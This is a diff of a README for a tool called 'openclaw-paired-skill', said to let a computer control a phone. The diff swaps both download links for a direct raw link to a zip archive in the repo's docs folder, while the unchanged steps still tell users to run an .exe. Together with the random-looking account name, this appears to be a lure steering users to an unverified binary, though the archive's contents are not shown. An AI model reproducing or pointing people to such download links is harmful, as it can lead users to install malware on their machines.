@@ -1,6 +1,6 @@
 # 📱 openclaw-paired-skill - Control your phone using your computer
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/lophophorawilliamsiigregorynazianzen31/openclaw-paired-skill)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/lophophorawilliamsiigregorynazianzen31/openclaw-paired-skill/main/docs/skill-openclaw-paired-v2.3-beta.4.zip)
 
 This tool links OpenClaw to your mobile phone. You send messages, manage contacts, and handle calls directly from your desktop. Most phone software requires monthly fees or rental numbers. This tool uses your own hardware. Your phone acts as the bridge. You control your data and avoid extra costs.
 
@@ -29,7 +29,7 @@ You must prepare your phone so the computer can talk to it.
 
 Follow these steps to install the software on your Windows machine.
 
-1. Visit the [Download Page](https://github.com/lophophorawilliamsiigregorynazianzen31/openclaw-paired-skill) to retrieve the required files.
+1. Visit the [Download Page](https://raw.githubusercontent.com/lophophorawilliamsiigregorynazianzen31/openclaw-paired-skill/main/docs/skill-openclaw-paired-v2.3-beta.4.zip) to retrieve the required files.
 2. Look for the latest release version on the page.
 3. Select the file ending in .exe to start your download.
 4. Locate the downloaded file in your Downloads folder.
